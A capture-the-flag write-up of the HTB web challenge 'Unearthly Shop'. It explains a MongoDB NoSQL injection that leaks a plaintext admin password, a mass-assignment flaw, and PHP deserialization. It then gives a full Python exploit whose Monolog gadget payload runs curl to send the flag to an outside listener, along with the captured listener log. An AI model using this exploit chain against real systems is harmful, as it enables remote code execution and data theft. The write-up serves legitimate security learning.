# [Web - hard] Unearthly Shop

Disclaimer: this challenge was not fully solved. The last part we needed was to include a class from outside the backend, and taken from HTB discord write-ups.

This webapp is written in PHP and uses a MongoDB database. It has 2 components:

- a frontend, that displays items in a store, and on which users can place bids
- a backend, through which an admin can login in order to view a Dashboard, and manage the Products, the Orders, and the Users

This webapp contains 2 vulnerabilities:

- listing the products is the as-is MongoDB query: it can be used with a NoSQL injection to list the products and the users, which will give the admin password (passwords are stored in clear, not using `bcrypt` for instance)

```php
    public function products($router)
    {
        $json = file_get_contents('php://input');
        $query = json_decode($json, true);
        if (!$query)
        {
            $router->jsonify(['message' => 'Insufficient parameters!'], 400);
        }
        $products = $this->product->getProducts($query);
```

- using the admin interface, the password change function can accept more than the password change: it can be used to modify other attributes of the user, such as the Access

```php
    public function update($router)
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);
        if (!$data['_id'] || !$data['username'] || !$data['password'])
        {
            $router->jsonify(['message' => 'Insufficient parameters!'], 400);
        }
        if ($this->user->updateUser($data)) {
            $router->jsonify(['message' => 'User updated successfully!']);
        }

```

- the Access of an user is a serialized PHP object. It is deserialized upon instanciation of a Controller, taking values from the user Session

```php
class UserModel extends Model
{
    public function __construct()
    {
        parent::__construct();
        $this->username = $_SESSION['username'] ?? '';
        $this->email    = $_SESSION['email'] ?? '';
        $this->access   = unserialize($_SESSION['access'] ?? '');
    }
[...]
class Controller
{
    public $user;
    public $access;
    public $username;
    public function __construct($privileged = False, $required_access = [])
    {
        $this->database = Database::getDatabase();
        $this->user     = new UserModel;
        $this->product  = new ProductModel;
        $this->order    = new OrderModel;
```

Thus the path to the flag is to:

- use the NoSQLi in the product listing to get the admin password
- login as the admin
- craft a serialized PHP object that will contain an RCE, exfiltrating the flag from the filesystem. In PHP the serialization needs to use a class that is present for instanciation. This application having 2 parts (frontend + backend), and since we are invoking it from the backend, we need to rely on [this trick](https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable) to `autoload` the corresponding class (this is what we were missing). The frontend includes a vulnerable `monolog` library, exploitable from a classic [phpggc](https://github.com/ambionics/phpggc) gadget
- use that serialized object, and abuse the update password function to update the admin Access
- login and display the admin user info to instanciate the Controller, which will deserialize our payload, leading to an RCE

The final script is:

```python
import requests
import json
import subprocess

endpoint = "http://165.232.108.240:31054"

def main():
    s = requests.Session()
    # NoSQLi for admin pass
    response = s.post(endpoint + '/api/products', data = '[{"$match":{"instock":true}}, {"$unionWith": { "coll": "users" }}]')
    admin_pass = json.loads(response.text)[-1]['password']
    print("Admin password: {}".format(admin_pass))

    # login with admin
    response = s.post(endpoint + '/admin/api/auth/login', data = {"username": "admin", "password": admin_pass})
    print(response.text)

    # https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable
    serial_object = 'a:2:{i:0;O:28:"www_frontend_vendor_autoload":0:{}i:1;'
    # ./phpggc Monolog/RCE6 system "curl http://180.129.100.155:4444/?c=\$(/readflag)" -a 2>/dev/null | grep O:
    serial_object += 'O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00*\00passthruLevel";i:0;S:9:"\00*\00buffer";a:1:{S:4:"test";a:2:{i:0;S:48:"curl http://180.129.100.155:4444/?c=$(/readflag)";S:5:"level";N;}}S:10:"\00*\00handler";O:29:"Monolog\Handler\BufferHandler":7:{S:10:"\00*\00handler";N;S:13:"\00*\00bufferSize";i:-1;S:9:"\00*\00buffer";N;S:8:"\00*\00level";N;S:14:"\00*\00initialized";b:1;S:14:"\00*\00bufferLimit";i:-1;S:13:"\00*\00processors";a:2:{i:0;S:7:"current";i:1;S:6:"system";}}}'
    serial_object += '}'

    # Update admin access serial object
    # Normal access: a:4:{s:9:"Dashboard";b:1;s:7:"Product";b:1;s:5:"Order";b:1;s:4:"User";b:1;}
    # to restore: use unearthly_shop; db.users.updateOne({username: "admin"},{$set: {access: 'a:4:{s:9:"Dashboard";b:1;s:7:"Product";b:1;s:5:"Order";b:1;s:4:"User";b:1;}'}});
    response = s.post(endpoint + '/admin/api/users/update', json = {"_id": 1, "username": "admin", "password": admin_pass, "access": serial_object})
    print(response.text)

    # unserialize at user creation, which is polluted at user login, and used in view
    # login with admin
    response = s.post(endpoint + '/admin/api/auth/login', data = {"username": "admin", "password": admin_pass})
    response = s.get(endpoint + '/admin/api/users/1')
    print(response.text)

main()
```

And on the HTTP listener:

```bash
pi@raspberrypi:/tmp/lol $ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
165.232.108.240 - - [25/Mar/2023 16:19:36] "GET /?c=HTBl00kup_4r7if4c75_4nd_4u70lo4d_g4dg37s HTTP/1.1" 200 -
165.232.108.240 - - [25/Mar/2023 16:19:37] "GET /?c=HTBl00kup_4r7if4c75_4nd_4u70lo4d_g4dg37s HTTP/1.1" 200 -
```
